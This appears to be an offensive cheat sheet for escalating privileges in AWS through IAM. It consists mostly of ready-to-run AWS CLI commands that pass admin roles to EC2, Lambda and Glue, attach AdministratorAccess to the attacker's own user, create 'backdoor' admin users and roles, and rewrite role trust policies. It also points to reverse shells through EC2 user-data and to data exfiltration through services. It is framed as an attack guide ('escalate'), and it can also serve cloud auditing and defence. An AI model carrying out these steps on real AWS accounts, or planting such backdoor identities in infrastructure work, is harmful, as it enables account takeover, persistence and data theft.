# **Core Concepts**

- **`iam:PassRole`**: Lets you pass an IAM role to a service (e.g., EC2, Lambda).
- **`iam:Create*`**, **`iam:Put*`**, **`iam:UpdateAssumeRolePolicy`**: Can lead to full compromise.
- **Abusable Services**: EC2, Lambda, CloudFormation, Glue, SageMaker, DataPipeline.

---

# **1. `iam:PassRole` + Service Abuse**

If you can pass a high-privilege role **and** start a service that uses it → escalation.

## **a. EC2**

```bash
aws ec2 run-instances --image-id [ami-id] --iam-instance-profile Name=[admin-role] ...
```

## **b. Lambda**

```bash
aws lambda create-function --function-name backdoor --role [admin-role-arn] ...
```

## **c. Glue**

```bash
aws glue create-dev-endpoint --role-arn [admin-role-arn] --endpoint-name evil
```

---

# **2. Modify or Attach Inline Policies**

## **a. Update your own policy to add permissions:**

```bash
aws iam put-user-policy --user-name [me] --policy-name escalator --policy-document file://full-admin.json
```

## **b. Attach a managed admin policy:**

```bash
aws iam attach-user-policy --user-name [me] --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

---

# **3. Create a New Admin Role/User**

## **a. Create a new user**

```bash
aws iam create-user --user-name backdoor
aws iam attach-user-policy --user-name backdoor --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

## **b. Create a new role with a trust policy**

```bash
aws iam create-role --role-name escalate-me --assume-role-policy-document file://trust.json
aws iam attach-role-policy --role-name escalate-me --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

---

# **4. Update Trust Policies for Existing Roles**

> Abuse `iam:UpdateAssumeRolePolicy` to let yourself assume an admin role.
> 

```bash
aws iam update-assume-role-policy --role-name [admin-role] --policy-document file://evil-trust.json
```

---

# **5. Assume a Role**

> Only works if you're trusted by the role (check trust policy).
> 

```bash
aws sts assume-role --role-arn arn:aws:iam::123456789012:role/Admin --role-session-name session1
```

---

# **6. Use Services to Execute Code**

If you can launch a service and inject a script, you can exfil data or gain shell access.

- Lambda: backdoor with high-priv role
- Glue: launch with shell script
- EC2: start instance with user-data reverse shell
- SSM: run commands on existing EC2

---

# **Dangerous IAM Actions to Look For**

### If a user/role has any of these, escalate:

```
iam:PassRole
iam:AttachUserPolicy
iam:PutUserPolicy
iam:UpdateAssumeRolePolicy
iam:CreatePolicy
iam:CreateUser / CreateRole
lambda:CreateFunction
ec2:RunInstances
glue:CreateDevEndpoint
ssm:SendCommand
```
